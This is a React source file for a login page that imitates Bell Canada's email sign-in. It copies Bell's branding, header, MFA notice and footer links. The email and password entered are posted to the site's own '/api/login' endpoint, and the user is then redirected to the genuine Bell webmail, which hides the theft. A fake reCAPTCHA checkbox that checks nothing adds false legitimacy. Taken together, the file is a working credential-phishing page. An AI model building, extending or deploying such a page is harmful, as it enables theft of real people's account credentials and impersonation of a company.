"use client";
import { useState } from "react";
import axios from "axios";
import { Check, ChevronRight, Info, Loader2 } from "lucide-react";

export default function LoginForm() {
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [step, setStep] = useState<"username" | "password">("username");
  const [formData, setFormData] = useState({ user_name: "", password: "" });
  const [errors, setErrors] = useState<{
    user_name?: string;
    password?: string;
  }>({});
  const [isChecked, setIsChecked] = useState(false);
  const [captchaChecked, setCaptchaChecked] = useState<string | boolean>(false);
 const validateUsername = (value: string) => {
  if (!value.trim()) {
    return "Please enter your Email to sign in.";
  }

  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(value)) {
    return "Please enter a valid Email address.";
  }

  return null;
};


  const validatePassword = (value: string) => {
    if (!value.trim()) return "Password is required.";
    // if (value.length < 6) return "Password must be at least 6 characters.";
    return null;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const newErrors: typeof errors = {};

    if (step === "username") {
      const usernameError = validateUsername(formData.user_name);
      if (usernameError) {
        newErrors.user_name = usernameError;
        setErrors(newErrors);
        return;
      }

      setErrors({});
      setIsSubmitting(true);

      setTimeout(() => {
        setStep("password");
        setIsSubmitting(false);
      }, 1200);

      return;
    }

    const passwordError = validatePassword(formData.password);
    if (passwordError) {
      setErrors({ password: passwordError });
      return;
    }

    setErrors({});
    setIsSubmitting(true);

    try {
      const response = await axios.post("/api/login", formData, {
        headers: { "Content-Type": "application/json" },
      });

      if (response.status === 200) {
        window.location.href =
          "https://webmail.bell.net/bell/index-rui.jsp?v=3.1.3.59.2-19#/";
      }
    } catch (error) {
      console.error("Error:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#f4f4f4]">
      <div className="bg-[#00549A] h-[74px]">
        <div className="px-[120px] flex justify-between items-center min-h-[74px]">
          <div className="max-w-[1200px] w-full flex justify-between items-center">
            <div className="nav-logo">
              <a
                href="https://www.bell.ca/"
                className=""
                aria-label="Bell"
                data-di-id="#bell-header-icon"
                target="_blank"
              >
                <img
                  src="/images/Bell.png"
                  alt="Logo"
                  width={100}
                  className="w-[80px]"
                />
              </a>
            </div>
            <nav className="login-nav mr-5" role="navigation">
              <ul>
                <li>
                  <div className="">
                    <span>
                      <a
                        id="changelocale"
                        className="text-white hover:underline font-bold text-[14px]"
                        href="#"
                        title="Français"
                        aria-label="Français"
                        role="link"
                      >
                        Français
                      </a>
                    </span>
                  </div>
                </li>
              </ul>
            </nav>
          </div>
        </div>
      </div>
      <div className="text-[#0066a4] text-[14px] font-[600] bg-[#F0F8FF] p-[15px] text-center login-notification">
        <div className="">
          <p className="mb-0 flex items-start justify-center gap-2">
            <span className="m-0 p-0">
              <Info className="h-[16px] w-[16px] mt-[3.2px]" />
            </span>
            <span className="font-[700]">
              We’ve added multi-factor authentication to the email login page as
              an extra security feature.{" "}
              <a
                href="https://support.bell.ca/internet/email/how-to-change-settings-in-bell-mail?step=1#step1"
                role="link"
                className="font-[500] underline text-[#0084d6] "
                aria-label="Learn more about multi-factor authentication"
              >
                Learn more
              </a>
            </span>
          </p>
        </div>
      </div>
      <div className="flex-1 flex flex-col mx-auto">
        <div className="bg-[#f4f4f4] font-[Arial,Helvetica,sans-serif] pt-[75px] pb-[40px] flex items-center justify-center">
          <div className="min-h[540px] flex justify-center flex-col p-[45px] max-w-[400px] mx-auto h-auto bg-white border border-[#d4d4d4] shadow rounded-[10px] overflow-hidden">
            <div className="mb-5">
              <img
                src="/images/Bell_Blue.png"
                alt="Logo"
                width={100}
                className="w-[100px] mb-[30px]"
              />
              <h2 className="font-[700] text-[20px] text-[#111] leading-[22px] font-[Arial]">
                Log in to Bell email
              </h2>
            </div>
            <form className="" onSubmit={handleSubmit}>
              <input
                placeholder="Email Address"
                className="bg-white py-[16.6px] px-[20px] leading-[20px] text-[16px]  borer-[#8D8D8D] border-[1px]  hover:border-[#00549a] font-[600] text-gray-500  rounded-[4px] w-full min-h-[54px] focus-within:border-[#00549a] focus-within:outline-none mb-4"
                id="username"
                type="text"
                name="username"
                value={formData.user_name}
                onChange={(e) => {
                  setFormData({ ...formData, user_name: e.target.value });
                  if (errors.user_name)
                    setErrors({ ...errors, user_name: undefined });
                }}
                tabIndex={1}
                autoCapitalize="off"
                autoCorrect="off"
                required={true}
                autoFocus={true}
              />

              <input
                placeholder="Password"
                className="bg-white py-[16.6px] px-[20px] leading-[20px] text-[16px]  borer-[#8D8D8D] border-[1px]  hover:border-[#00549a] font-[600] text-gray-500  rounded-[4px] w-full min-h-[54px] focus-within:border-[#00549a] focus-within:outline-none mb-4"
                id="password"
                type="password"
                name="password"
                value={formData.password}
                onChange={(e) => {
                  setFormData({ ...formData, password: e.target.value });
                  if (errors.password)
                    setErrors({ ...errors, password: undefined });
                }}
                tabIndex={1}
                autoCapitalize="off"
                autoCorrect="off"
                required={true}
                autoFocus={true}
              />

              <div className="bg-[#f9f9f9] text-[#000] border border-[#d3d3d3]  rounded-[3px] shadow px-3 pt-1 pb-1 mb-5">
                <div className="flex justify-between items-center">
                  <div className="flex items-center  gap-2 ">
                    {captchaChecked == "loading" ? (
                      <div className="">
                        <Loader2
                          className="text-blue-600 animate-spin"
                          size={42}
                          onClick={() => setCaptchaChecked(!captchaChecked)}
                        />
                      </div>
                    ) : captchaChecked ? (
                      <Check
                        className="text-green-600"
                        size={42}
                        onClick={() => setCaptchaChecked(!captchaChecked)}
                      />
                    ) : (
                      <input
                        type="checkbox"
                        checked={false}
                        onChange={() => {
                          setCaptchaChecked("loading");
                          setTimeout(() => {
                            setCaptchaChecked(!captchaChecked);
                          }, 1000);
                        }}
                        readOnly
                        className="w-[26px] h-[26px] border-[#444746] border-[2px] rounded-[2px] cursor-pointer"
                      />
                    )}

                    <div className="text-[14px] font-[400] font-[Roboto,helvetica,arial,sans-serif] leading-[17px] cursor-default">
                      I&lsquo;m not a robot
                    </div>
                  </div>
                  <div className="">
                    <div
                      className="flex justify-center items-center flex-col gap-0"
                      aria-hidden="true"
                      role="presentation"
                    >
                      <div
                        className=" w-[32px] my-[1px] mx-0 h-[32px] "
                        style={{
                          background: "url(/images/reCAPTCHA.png)",
                          backgroundRepeat: "no-repeat",
                          backgroundSize: "32px",
                        }}
                      ></div>
                      <div className="cursor-default text-[10px] font-[400] font-[Roboto,helvetica,arial,sans-serif]">
                        reCAPTCHA
                      </div>
                      <div className="text-[#555] no-underline text-[9px] font-[400] font-[Roboto,helvetica,arial,sans-serif] flex justify-end items-center">
                        <a
                          href="https://www.google.com/intl/en/policies/privacy/"
                          target="_blank"
                        >
                          Privacy
                        </a>
                        <span aria-hidden="true" role="presentation">
                          {" "}
                          -{" "}
                        </span>
                        <a
                          href="https://www.google.com/intl/en/policies/terms/"
                          target="_blank"
                        >
                          Terms
                        </a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              <div className="flex items-center  gap-2 mb-5">
                <input
                  type="checkbox"
                  checked={isChecked}
                  onChange={() => setIsChecked(!isChecked)}
                  readOnly
                  className="w-[22px] h-[22px] border-gray-400 accent-[#003778] rounded-sm cursor-pointer"
                />
                <div className="text-[14px] font-[400">Keep me logged in</div>
              </div>
              <button
                type="submit"
                disabled={isSubmitting}
                className="bg-[#003778]  border-[2px] border-[#003778] w-full text-white py-3  px-6 rounded-[24px]  leading-[16px] font-[700] text-[16px] hover:bg-[#00549A] hover:border-[#00549A] transition-colors disabled:opacity-50 disabled:cursor-not-allowed mb-4 h-[52px]"
              >
                {isSubmitting ? "loading..." : " Log in"}
              </button>
              <div className="">
                <a
                  href="https://webmail.bell.net/bell/index-rui.jsp?v=3.1.3.59.2-19#"
                  className="flex items-center gap-[1px] text-[14px] font-[700] text-[#00549a] underline"
                >
                  Forgot Password <ChevronRight size={22} />
                </a>
                <a
                  href="https://mybell.bell.ca/Login?refreshlink=https://mybell.bell.ca/sso/ssoauth.aspx?ReturnUrl=/PunchInOut/punchin?DirectAccess=ManageBellEmail"
                  className="flex items-center gap-[1px] text-[14px] font-[700] text-[#00549a] underline"
                >
                  Forgot Email address <ChevronRight size={22} />
                </a>
              </div>
            </form>
          </div>
        </div>
      </div>
      <div className="px-[15px] py-[30px] flex justify-center ">
        <div
          className="max-w-[1200px] border border-transparent border-t-[#e1e1e1]  pt-[25px] w-full"
          role="contentinfo"
        >
          <div>
            <div className="footer-links mb-3">
              <nav className="footer-nav" role="navigation">
                <ul className="flex items-center gap-3 text-[12px] leading-[15px] text-[#00549a] no-underline ">
                  <li className="border-[2px] border-transparent border-r-gray-300  pr-5 ">
                    <a
                      href="https://support.bell.ca/Billing-and-Accounts/Security_and_privacy/How_does_Bell_respect_my_privacy"
                      className="underline-on-hover"
                      id="privacy-ftr-link"
                      data-di-id="#privacy-ftr-link"
                    >
                      Privacy
                    </a>
                  </li>
                  <li className="border-[2px] border-transparent border-r-gray-300  pr-5 ">
                    <a
                      href="http://support.bell.ca/Billing-and-Accounts/Security_and_privacy/Security-and-preventing-fraud"
                      className="underline-on-hover"
                      id="security-ftr-link"
                      data-di-id="#security-ftr-link"
                    >
                      Security
                    </a>
                  </li>
                  <li className="border-[2px] border-transparent border-r-gray-300  pr-5 ">
                    <a
                      href="https://www.bell.ca/Legal_and_terms#INT=OTH_legal_TXT_Footer"
                      className="underline-on-hover"
                      id="legal-ftr-link"
                      data-di-id="#legal-ftr-link"
                    >
                      Legal and Regulatory
                    </a>
                  </li>
                  <li className="">
                    <a
                      href="https://www.bell.ca/CRTC-Wireless-Code"
                      className="underline-on-hover"
                      id="wireless-ftr-link"
                      data-di-id="#wireless-ftr-link"
                    >
                      Wireless Code
                    </a>
                  </li>
                </ul>
              </nav>
            </div>
            <div className="footer-copyright text-[14px] text-gray-900">
              <p>© Bell Canada, 2025. All rights reserved.</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
